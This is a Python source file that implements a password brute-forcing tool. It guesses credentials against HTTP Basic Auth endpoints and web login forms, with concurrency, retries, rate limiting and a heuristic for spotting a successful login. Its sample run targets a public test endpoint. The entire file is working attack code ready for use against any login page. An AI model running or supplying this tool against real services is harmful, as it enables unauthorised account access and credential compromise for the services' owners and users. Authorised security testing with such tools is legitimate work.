# toolkit/brute_forcer.py
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from threading import Semaphore

logger = logging.getLogger("brute_forcer")

def build_session(retries=3, backoff=0.3, pool_maxsize=10):
    """Create requests.Session with retry & connection pooling."""
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=backoff,
                  status_forcelist=(429, 500, 502, 503, 504))
    adapter = HTTPAdapter(max_retries=retry, pool_maxsize=pool_maxsize)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s

class RateLimiter:
    """Simple fixed-delay rate limiter."""
    def __init__(self, delay_seconds=0.1):
        self.delay = delay_seconds
        self._last = 0

    def wait(self):
        now = time.perf_counter()
        elapsed = now - self._last
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self._last = time.perf_counter()

def http_basic_bruteforce(target_url, username, passlist,
                         concurrency=1, rate_delay=0.5, timeout=5):
    """
    HTTP Basic Auth brute force:
    - concurrency: number of simultaneous attempts
    - rate_delay: minimal delay between requests per worker (s)
    Returns first successful (password, status_code) or (None, None).
    """
    session = build_session(pool_maxsize=concurrency)
    sem = Semaphore(concurrency)
    limiter = RateLimiter(rate_delay)

    def try_pwd(pwd):
        with sem:
            limiter.wait()
            try:
                r = session.get(target_url, auth=(username, pwd), timeout=timeout)
                logger.debug("Tried %s -> %s", pwd, r.status_code)
                if r.status_code != 401:
                    logger.info("Success with %s (status %s)", pwd, r.status_code)
                    return pwd, r.status_code
            except requests.RequestException as e:
                logger.debug("request err: %s", e)
        return None

    if concurrency <= 1:
        # sequential to avoid race/lockout
        for p in passlist:
            res = try_pwd(p)
            if res:
                return res
        return None, None

    # concurrent mode (returns first found)
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = {ex.submit(try_pwd, p): p for p in passlist}
        for fut in as_completed(futures):
            res = fut.result()
            if res:
                # cancel remaining (best-effort)
                for f in futures:
                    if not f.done():
                        f.cancel()
                return res
    return None, None

def form_bruteforce(login_url, user_field, pass_field, username, passlist,
                    concurrency=1, rate_delay=0.5, timeout=5, success_check=None):
    """
    Simple form brute-force:
    - success_check: optional callable(response) -> bool to reduce false positives
    - concurrency & rate limiting as above
    """
    session = build_session(pool_maxsize=concurrency)
    sem = Semaphore(concurrency)
    limiter = RateLimiter(rate_delay)

    def attempt(pwd):
        with sem:
            limiter.wait()
            try:
                data = {user_field: username, pass_field: pwd}
                r = session.post(login_url, data=data, timeout=timeout)
                logger.debug("Tried %s -> %s", pwd, r.status_code)
                if success_check:
                    if success_check(r):
                        logger.info("Success with %s", pwd)
                        return pwd, r
                else:
                    # heuristic: non-401 or redirect likely success
                    if r.status_code in (200, 302) and "invalid" not in r.text.lower():
                        logger.info("Possible success with %s", pwd)
                        return pwd, r
            except requests.RequestException as e:
                logger.debug("request err: %s", e)
        return None

    if concurrency <= 1:
        for p in passlist:
            res = attempt(p)
            if res:
                return res
        return None, None

    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = {ex.submit(attempt, p): p for p in passlist}
        for fut in as_completed(futures):
            res = fut.result()
            if res:
                for f in futures:
                    if not f.done():
                        f.cancel()
                return res
    return None, None

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    # Example usage
    pwds = ["123", "password", "admin"]
    print(http_basic_bruteforce("http://httpbin.org/basic-auth/user/pass", "user", pwds,
                                concurrency=2, rate_delay=0.2))
